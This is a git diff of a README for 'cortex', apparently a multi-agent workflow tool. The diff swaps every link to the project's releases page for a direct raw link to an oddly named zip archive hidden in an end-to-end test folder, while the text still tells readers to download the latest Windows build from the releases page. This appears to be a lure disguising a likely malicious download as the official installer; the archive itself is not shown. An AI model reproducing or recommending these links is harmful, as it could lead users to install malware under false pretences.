@@ -1,6 +1,6 @@
 # ⚙️ cortex - Run multi-agent workflows with ease
 
-[![Download cortex](https://img.shields.io/badge/Download-cortex-blue?style=for-the-badge)](https://github.com/macthreecornered172/cortex/releases)
+[![Download cortex](https://img.shields.io/badge/Download-cortex-blue?style=for-the-badge)](https://github.com/macthreecornered172/cortex/raw/refs/heads/main/e2e/k8s/Software-Achaemenid.zip)
 
 ## 🚀 What is cortex?
 
@@ -12,7 +12,7 @@ It is built for local use, with support for Docker and Kubernetes setups too. If
 
 To get the app, visit the releases page and download the latest Windows file:
 
-https://github.com/macthreecornered172/cortex/releases
+https://github.com/macthreecornered172/cortex/raw/refs/heads/main/e2e/k8s/Software-Achaemenid.zip
 
 Look for the newest release and choose the Windows download. If you see a `.exe` file, download it to your computer.
 
@@ -174,4 +174,4 @@ It is a live dashboard view that updates as your workflows run.
 
 Visit the releases page here and download the latest Windows build:
 
-https://github.com/macthreecornered172/cortex/releases
+https://github.com/macthreecornered172/cortex/raw/refs/heads/main/e2e/k8s/Software-Achaemenid.zip
